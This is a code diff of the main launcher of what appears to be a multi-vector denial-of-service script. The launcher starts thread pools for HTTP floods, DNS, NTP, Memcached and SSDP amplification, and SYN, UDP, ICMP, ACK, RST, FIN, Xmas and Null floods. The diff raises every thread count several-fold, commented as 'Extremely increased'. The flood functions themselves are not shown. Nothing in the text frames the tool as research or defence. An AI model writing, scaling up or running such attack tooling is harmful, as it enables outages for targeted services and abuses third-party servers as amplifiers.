@@ -198,67 +198,67 @@ def null_flood():
 # Main function to start all attacks in separate threads
 def main():
     threads = []
-    for _ in range(2500):  # Extremely increased number of threads for HTTP flood
+    for _ in range(10000):  # Extremely increased number of threads for HTTP flood
         thread = threading.Thread(target=http_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(1250):  # Extremely increased number of threads for DNS amplification
+    for _ in range(5000):  # Extremely increased number of threads for DNS amplification
         thread = threading.Thread(target=dns_amplification)
         threads.append(thread)
         thread.start()
 
-    for _ in range(600):  # Extremely increased number of threads for NTP amplification
+    for _ in range(2500):  # Extremely increased number of threads for NTP amplification
         thread = threading.Thread(target=ntp_amplification)
         threads.append(thread)
         thread.start()
 
-    for _ in range(600):  # Extremely increased number of threads for Memcached amplification
+    for _ in range(2500):  # Extremely increased number of threads for Memcached amplification
         thread = threading.Thread(target=memcached_amplification)
         threads.append(thread)
         thread.start()
 
-    for _ in range(600):  # Extremely increased number of threads for SSDP amplification
+    for _ in range(2500):  # Extremely increased number of threads for SSDP amplification
         thread = threading.Thread(target=ssdp_amplification)
         threads.append(thread)
         thread.start()
 
-    for _ in range(350):  # Extremely increased number of threads for SYN flood
+    for _ in range(1750):  # Extremely increased number of threads for SYN flood
         thread = threading.Thread(target=syn_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(400):  # Extremely increased number of threads for UDP flood
+    for _ in range(2000):  # Extremely increased number of threads for UDP flood
         thread = threading.Thread(target=udp_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(250):  # Extremely increased number of threads for ICMP flood
+    for _ in range(1250):  # Extremely increased number of threads for ICMP flood
         thread = threading.Thread(target=icmp_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(250):  # Extremely increased number of threads for ACK flood
+    for _ in range(1250):  # Extremely increased number of threads for ACK flood
         thread = threading.Thread(target=ack_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(250):  # Extremely increased number of threads for RST flood
+    for _ in range(1250):  # Extremely increased number of threads for RST flood
         thread = threading.Thread(target=rst_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(250):  # Extremely increased number of threads for FIN flood
+    for _ in range(1250):  # Extremely increased number of threads for FIN flood
         thread = threading.Thread(target=fin_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(250):  # Extremely increased number of threads for Xmas flood
+    for _ in range(1250):  # Extremely increased number of threads for Xmas flood
         thread = threading.Thread(target=xmas_flood)
         threads.append(thread)
         thread.start()
 
-    for _ in range(250):  # Extremely increased number of threads for Null flood
+    for _ in range(1250):  # Extremely increased number of threads for Null flood
         thread = threading.Thread(target=null_flood)
         threads.append(thread)
         thread.start()
